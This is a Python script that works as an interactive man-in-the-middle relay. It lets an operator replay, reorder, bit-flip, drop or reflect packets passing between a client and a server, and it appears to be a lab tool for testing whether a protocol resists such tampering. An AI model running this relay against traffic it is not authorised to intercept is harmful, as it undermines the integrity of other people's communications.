import socket
import sys

if len(sys.argv) != 5:
    print(
        "Usage:\n"
        "python3 attacks.py <ATTACKER_IP> <ATTACKER_PORT> "
        "<SERVER_IP> <SERVER_PORT>\n\n"
    )
    sys.exit(1)

ATTACKER_IP = sys.argv[1]
ATTACKER_PORT = int(sys.argv[2])
SERVER_IP = sys.argv[3]
SERVER_PORT = int(sys.argv[4])

def main():
    attacker = socket.socket()
    attacker.bind((ATTACKER_IP, ATTACKER_PORT))
    attacker.listen(1)

    print("[+] Waiting for client...")
    client_conn, _ = attacker.accept()
    print("[+] Client connected")

    server_conn = socket.socket()
    server_conn.connect((SERVER_IP, SERVER_PORT))
    print("[+] Connected to server")

    saved_packet = None
    reorder_buffer = []

    while True:
        data = client_conn.recv(4096)
        if not data:
            break

        print("\nChoose attack for this packet:")
        print("1 = none")
        print("2 = replay")
        print("3 = reorder")
        print("4 = bitflip")
        print("5 = drop")
        print("6 = reflection")

        choice = input("Attack> ").strip()

        if choice == "1":
            server_conn.sendall(data)

        elif choice == "2":
            if saved_packet is None:
                print("[*] Saving packet for replay")
                saved_packet = data
                server_conn.sendall(data)
            else:
                print("[*] Replaying saved packet")
                server_conn.sendall(saved_packet)

        elif choice == "3":
            reorder_buffer.append(data)
            if len(reorder_buffer) == 2:
                print("[*] Reordering packets")
                server_conn.sendall(reorder_buffer[1])
                server_conn.sendall(reorder_buffer[0])
                reorder_buffer.clear()
                continue
            else:
                print("[*] Waiting for second packet")
                continue

        elif choice == "4":
            print("[*] Bit-flip attack")
            tampered = data[:-1] + bytes([data[-1] ^ 0x01])
            server_conn.sendall(tampered)

        elif choice == "5":
            print("[*] Dropping packet")
            continue

        elif choice == "6":
            print("[*] Reflection attack")
            client_conn.sendall(data)
            continue

        else:
            print("[!] Invalid choice, forwarding normally")
            server_conn.sendall(data)

        reply = server_conn.recv(4096)
        if not reply:
            break

        client_conn.sendall(reply)

    client_conn.close()
    server_conn.close()
    attacker.close()

if __name__ == "__main__":
    main()
